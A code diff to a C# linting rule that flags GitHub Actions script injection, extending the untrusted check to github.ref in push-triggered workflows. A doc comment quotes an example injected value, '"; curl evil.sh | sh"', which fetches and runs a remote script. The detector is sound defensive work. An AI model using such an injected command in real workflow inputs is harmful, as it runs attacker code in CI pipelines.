@@ -7,7 +7,8 @@ namespace ActionLens.Core.Linting.Rules;
 /// Actions substitutes <c>${{ }}</c> before the shell ever sees the line, so a title, branch name or comment
 /// that contains <c>"; curl evil.sh | sh"</c> becomes part of the command line rather than part of a string.
 /// The payload is the attacker-controlled part of a workflow, which is why this is Critical rather than a
-/// style note; <c>github.head_ref</c> is the same hazard in a name that reads as safe.
+/// style note; <c>github.head_ref</c> and event-derived <c>github.ref</c> are the same hazard in names that
+/// read as safe.
 /// <para>
 /// The values that reach the script through <c>env:</c> are not this rule's problem — the substitution
 /// happens where the variable is <em>declared</em>, and the script then only quotes it — so only the
@@ -19,7 +20,7 @@ namespace ActionLens.Core.Linting.Rules;
 /// <c>run: |</c> body is not on the field's line.
 /// </para>
 /// </remarks>
-public sealed class ScriptInjectionRule : ILintRule
+internal sealed class ScriptInjectionRule : ILintRule
 {
     private static readonly string[] UntrustedRoots = ["github.event", "github.head_ref"];
 
@@ -40,7 +41,9 @@ public sealed class ScriptInjectionRule : ILintRule
             var scriptRange = LintContext.StepRange(step, "run");
             foreach (var expression in ExpressionTextScanner.Interpolations(script))
             {
-                if (!UntrustedRoots.Any(root => ExpressionTextScanner.Mentions(expression.Body, root)))
+                bool untrusted = UntrustedRoots.Any(root => ExpressionTextScanner.Mentions(expression.Body, root))
+                    || (CanRunOnPush(context.Workflow) && ExpressionTextScanner.Mentions(expression.Body, "github.ref"));
+                if (!untrusted)
                 {
                     continue;
                 }
@@ -60,4 +63,7 @@ public sealed class ScriptInjectionRule : ILintRule
 
         return findings;
     }
+
+    private static bool CanRunOnPush(Workflows.WorkflowDocument workflow) =>
+        workflow.Triggers.Events.Keys.Any(name => string.Equals(name, "push", StringComparison.OrdinalIgnoreCase));
 }
